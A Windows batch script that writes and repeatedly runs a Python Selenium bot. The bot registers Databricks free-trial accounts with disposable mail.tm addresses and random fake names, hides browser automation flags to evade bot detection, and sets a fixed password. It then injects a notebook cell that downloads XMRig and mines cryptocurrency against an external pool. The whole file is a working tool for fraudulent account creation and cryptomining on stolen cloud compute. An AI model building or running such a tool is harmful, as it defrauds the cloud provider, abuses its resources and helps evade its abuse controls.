pip install selenium names
echo	from selenium import webdriver	>  autodatabricks.py
echo	from selenium.webdriver import ActionChains	>>  autodatabricks.py
echo	from selenium.webdriver.common.keys import Keys	>>  autodatabricks.py
echo	from selenium.webdriver.support.ui import WebDriverWait	>>  autodatabricks.py
echo	from selenium.webdriver.common.by import By	>>  autodatabricks.py
echo	from selenium.webdriver.support import expected_conditions as EC	>>  autodatabricks.py
echo	import names	>>  autodatabricks.py
echo	import time	>>  autodatabricks.py
echo	import tkinter as tk	>>  autodatabricks.py
echo	import string	>>  autodatabricks.py
echo	import random	>>  autodatabricks.py
echo	option = webdriver.ChromeOptions()	>>  autodatabricks.py
echo	#Removes navigator.webdriver flag	>>  autodatabricks.py
echo	# For older ChromeDriver under version 79.0.3945.16	>>  autodatabricks.py
echo	option.add_experimental_option("excludeSwitches", ["enable-automation"])	>>  autodatabricks.py
echo	option.add_experimental_option('useAutomationExtension', False)	>>  autodatabricks.py
echo	#For ChromeDriver version 79.0.3945.16 or over	>>  autodatabricks.py
echo	option.add_argument('--disable-blink-features=AutomationControlled')	>>  autodatabricks.py
echo	#Open Browser	>>  autodatabricks.py
echo	driver = webdriver.Chrome(executable_path='chromedriver',options=option)	>>  autodatabricks.py
echo	driver.get("https://mail.tm/en/")	>>  autodatabricks.py
echo	WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[contains(text(),"40 MB")]')))	>>  autodatabricks.py
echo	time.sleep(1)	>>  autodatabricks.py
echo	continue_link = driver.find_element_by_xpath('//*[@id="address"]').click() #copy email	>>  autodatabricks.py
echo	root = tk.Tk()	>>  autodatabricks.py
echo	print(root.clipboard_get())	>>  autodatabricks.py
echo	email=root.clipboard_get()	>>  autodatabricks.py
echo	driver.execute_script("window.open('about:blank','secondtab');")	>>  autodatabricks.py
echo	print("Open databricks")	>>  autodatabricks.py
echo	# It is switching to second tab now	>>  autodatabricks.py
echo	driver.switch_to.window("secondtab")	>>  autodatabricks.py
echo	# In the second tab, it opens geeksforgeeks	>>  autodatabricks.py
echo	driver.get('https://databricks.com/try-databricks')	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="FirstName"]').send_keys(names.get_first_name())	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="LastName"]').send_keys(names.get_last_name())	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="Company"]').send_keys(names.get_last_name())	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="Email"]').send_keys(email)	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="Title"]').send_keys("staff")	>>  autodatabricks.py
echo	checkboxElement = driver.find_element_by_id("mkto_form_consent")	>>  autodatabricks.py
echo	checkboxElement.send_keys(Keys.SPACE)	>>  autodatabricks.py
echo	checkboxElement.send_keys(Keys.END)	>>  autodatabricks.py
echo	time.sleep(2)	>>  autodatabricks.py
echo	print("Get Start for Free")	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="submitToMktoForm_2021Feb10"]/div[21]/span/button').click()	>>  autodatabricks.py
echo	print("Get Start")	>>  autodatabricks.py
echo	WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="ce-placeholder-button"]')))	>>  autodatabricks.py
echo	checkboxElementw = driver.find_element_by_xpath('//*[@id="ce-placeholder-button"]')	>>  autodatabricks.py
echo	checkboxElementw.send_keys(Keys.ENTER)	>>  autodatabricks.py
echo	WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[contains(text(),"Time to check your email!")]')))	>>  autodatabricks.py
echo	print("Check Email")	>>  autodatabricks.py
echo	driver.get("https://mail.tm/en/")	>>  autodatabricks.py
echo	WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul'))) #waiting for email's databricks coming	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul').click() #click read email	>>  autodatabricks.py
echo	WebDriverWait(driver, 120).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[contains(text(),"Download")]'))) #waiting topic email to switch frame	>>  autodatabricks.py
echo	driver.switch_to_frame("iFrameResizer0")	>>  autodatabricks.py
echo	driver.find_element_by_xpath('/html/body/p[2]/a').click()  #Click "this link"	>>  autodatabricks.py
echo	time.sleep(5)	>>  autodatabricks.py
echo	driver.switch_to_default_content()	>>  autodatabricks.py
echo	handles = driver.window_handles	>>  autodatabricks.py
echo	size = len(handles)	>>  autodatabricks.py
echo	for x in range(size):	>>  autodatabricks.py
echo	    if handles[x] != driver.current_window_handle:	>>  autodatabricks.py
echo	      driver.switch_to.window(handles[x])	>>  autodatabricks.py
echo	      print(driver.title)	>>  autodatabricks.py
echo	WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="reset-container"]/div/div[1]/input')))	>>  autodatabricks.py
echo	print("Password")	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[1]/input').send_keys("1234Asdfg@")	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[2]/input').send_keys("1234Asdfg@")	>>  autodatabricks.py
echo	time.sleep(3)	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[3]/button').click()	>>  autodatabricks.py
echo	print("Goto workspace")	>>  autodatabricks.py
echo	for button in WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH, '//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]'))):	>>  autodatabricks.py
echo	  button.click()	>>  autodatabricks.py
echo	#waiting for input notebook's name	>>  autodatabricks.py
echo	WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="input"]')))	>>  autodatabricks.py
echo	driver.find_element_by_xpath('//*[@id="input"]').send_keys("Plant")	>>  autodatabricks.py
echo	time.sleep(2)	>>  autodatabricks.py
echo	driver.find_element_by_xpath('/html/body/div[3]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]/span').click() #Click Create	>>  autodatabricks.py
echo	#randomLetter = random.choice(string.ascii_letters)	>>  autodatabricks.py
echo	#randomLette = random.choice(string.ascii_letters)	>>  autodatabricks.py
echo	WebDriverWait(driver, 180).until(EC.visibility_of_all_elements_located((By.XPATH,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[2]/div[2]/div/div[3]/div[1]/div/div/div/div[4]/div[1]/div/div/div/div[5]/div/pre')))	>>  autodatabricks.py
echo	driver.find_element_by_css_selector(".CodeMirror-line").click()	>>  autodatabricks.py
echo	driver.find_element_by_css_selector(".CodeMirror textarea").send_keys("!wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o pool.allcoins.pw:3333 -a rx -k -u allcoins.pw -p 511240")	>>  autodatabricks.py
echo	driver.find_element_by_css_selector(".fa-play").click()	>>  autodatabricks.py
echo	driver.find_element_by_css_selector(".run-cell > .fa").click()	>>  autodatabricks.py
echo	driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[16]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()	>>  autodatabricks.py
echo	print("Complete Project...")	>>  autodatabricks.py
:loop
python autodatabricks.py
timeout /t 300 /nobreak
goto :loop
